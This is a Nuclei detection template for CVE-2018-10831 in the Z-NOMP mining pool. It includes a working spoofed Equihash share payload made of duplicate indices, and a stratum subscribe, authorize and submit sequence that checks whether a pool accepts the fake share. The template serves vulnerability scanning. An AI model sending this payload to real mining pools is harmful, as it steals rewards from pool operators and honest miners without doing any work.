id: CVE-2018-10831

info:
  name: Z-NOMP Equihash Solution Verifier - Share Spoofing
  author: simiondolha
  severity: high
  description: |
    Z-NOMP before 2018-04-05 has an incorrect Equihash solution verifier that allows
    attackers to spoof mining shares by submitting duplicate indices {x1=1,x2=1,...,x512=1}.
    The XOR of identical values cancels to zero, bypassing proof-of-work verification.
  impact: |
    Attackers can steal mining rewards without performing computational work.
  remediation: |
    Update to Z-NOMP versions after 2018-04-05 using patched equihashverify from
    https://github.com/HorizenOfficial/equihashverify
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-10831
    - https://blog.360totalsecurity.com/en/attackers-fake-computational-power-steal-cryptocurrencies-mining-pools/
    - https://blog.horizen.io/update-for-the-equihash-mining-application-z-nomp/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2018-10831
    cwe-id: CWE-327
    cpe: cpe:2.3:a:zclassic:z-nomp:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: zclassic
    product: z-nomp
    shodan-query: "mining.notify"
  tags: network,cve,cve2018,znomp,crypto,mining,stratum,equihash,kev

variables:
  exploit: "fd4005000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

tcp:
  - host:
      - "{{Hostname}}"
    port: 3032,3333,3334

    inputs:
      - data: "{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"nuclei/1.0\"]}\n"
        read: 2048
        name: subscribe

      - data: "{\"id\":2,\"method\":\"mining.authorize\",\"params\":[\"test.worker\",\"x\"]}\n"
        read: 2048
        name: authorize

      - data: "{\"id\":3,\"method\":\"mining.submit\",\"params\":[\"test.worker\",\"0\",\"00000000\",\"00000000\",\"{{exploit}}\"]}\n"
        read: 2048
        name: submit

    matchers-condition: and
    matchers:
      # Matcher 1: Confirm stratum pool (subscribe response)
      - type: word
        part: subscribe
        words:
          - "mining.notify"
          - "mining.set_target"
        condition: or

      # Matcher 2: Exploit accepted - submit response has result:true AND id:3
      - type: word
        part: submit
        words:
          - '"id":3'
          - '"id": 3'
        condition: or

      - type: word
        part: submit
        words:
          - '"result":true'
          - '"result": true'
        condition: or

    extractors:
      - type: regex
        part: submit
        name: submit_result
        regex:
          - '"result":\s*(true|false|null)'
